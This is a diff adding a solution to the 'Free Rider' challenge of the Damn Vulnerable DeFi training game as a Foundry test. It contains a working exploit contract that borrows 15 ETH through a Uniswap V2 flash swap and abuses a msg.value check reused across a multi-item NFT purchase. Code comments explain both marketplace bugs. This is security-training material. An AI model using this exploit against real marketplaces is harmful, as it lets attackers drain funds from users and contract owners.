@@ -3,12 +3,74 @@ pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
 
+import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";
+
 import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+
+contract AttackFreeRider {
+    FreeRiderNFTMarketplace public marketplace;
+    IERC721 public nft;
+    WETH9 public weth;
+    IUniswapV2Pair public pair;
+    FreeRiderBuyer public buyer;
+
+    constructor(
+        FreeRiderBuyer buyer_,
+        FreeRiderNFTMarketplace marketplace_,
+        address nft_,
+        WETH9 weth_,
+        IUniswapV2Pair pair_) {
+        buyer = buyer_;
+        marketplace = marketplace_;
+        nft = IERC721(nft_);
+        weth = weth_;
+        pair = pair_;
+        }
+
+    function attack() public {
+        // Get 15 ETH from uniswap
+        bytes memory data_ = abi.encode(address(this));
+        pair.swap(0, 15 ether, address(this), data_);
+
+        // Send the NFTs to the buyer
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(buyer), i);
+        }
+
+        // Send reward back to attacker
+        (bool success, ) = msg.sender.call{value: address(this).balance }(bytes(""));
+        require(success);
+    }
+
+    function uniswapV2Call(address, uint, uint amount1, bytes calldata) external {
+        uint256[] memory tokenIds_ = new uint256[](6);
+
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds_[i] = i;
+        }
+
+        weth.withdraw(amount1);
+        marketplace.buyMany{value: amount1}(tokenIds_);
+
+        uint256 fee_ = (amount1 * 0.03e18 / 1e18) + 1;
+        uint256 amountToReturn_ = amount1 + fee_;
+
+        weth.deposit{value: amountToReturn_}();
+        weth.transfer(address(pair), amountToReturn_);
+
+    }
+
+    function onERC721Received(address,address,uint256,bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    fallback() external payable {}
+}
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -149,7 +211,23 @@ contract FreeRider is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-        vm.startPrank(attacker, attacker);
+
+        // NOTE: This exploit is due to an incorrect check of the value being sent to the contract when buying many NFTs
+        // This is because it checks the msg.value which is consistent during the call, the second bug is due to the ownership of the
+        // NFT first being transferred then the ETH being sent to the owner which is now the new buyer. On top of this we used the flash swap
+        // functionality that uniswap V2 has to get enough ETH for the purchase.
+
+        vm.startPrank(attacker, attacker);  // NB: had to also get tx.origin!
+
+        AttackFreeRider attackFreeRider = new AttackFreeRider(
+            freeRiderBuyer,
+            freeRiderNFTMarketplace,
+            address(damnValuableNFT),
+            weth,
+            uniswapV2Pair
+        );
+
+        attackFreeRider.attack();
 
         vm.stopPrank();
         /** EXPLOIT END **/
